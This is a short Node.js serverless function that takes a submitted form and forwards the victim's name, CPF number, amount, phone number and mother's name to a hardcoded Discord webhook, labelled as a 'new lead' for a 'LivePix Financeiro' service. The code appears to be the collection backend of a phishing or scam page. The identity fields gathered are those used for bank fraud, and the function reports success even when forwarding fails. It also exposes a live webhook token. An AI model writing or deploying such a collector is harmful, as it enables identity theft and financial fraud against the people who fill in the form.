const axios = require('axios');

exports.handler = async (event) => {
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1461123914964013148/xlGjXfAU4EckmXTFDj80nPANGO2D9u52bZ7cgHhyrqnm4PNAcz-XwQt66-w8uJChbEjr";

    try {
        const data = JSON.parse(event.body);
        
        const embed = {
            title: "🚀 NOVO LEAD - LIVEPIX FINANCEIRO",
            color: 3066993,
            fields: [
                { name: "Nome", value: data.nome, inline: true },
                { name: "CPF", value: data.cpf, inline: true },
                { name: "Valor", value: `R$ ${data.valor}`, inline: true },
                { name: "Telefone", value: data.telefone, inline: false },
                { name: "Mãe", value: data.mae, inline: false }
            ],
            timestamp: new Date()
        };

        await axios.post(DISCORD_WEBHOOK, { embeds: [embed] });
        return { statusCode: 200, body: "OK" };
    } catch (error) {
        return { statusCode: 200, body: "Erro Discord mas segue fluxo" };
    }
};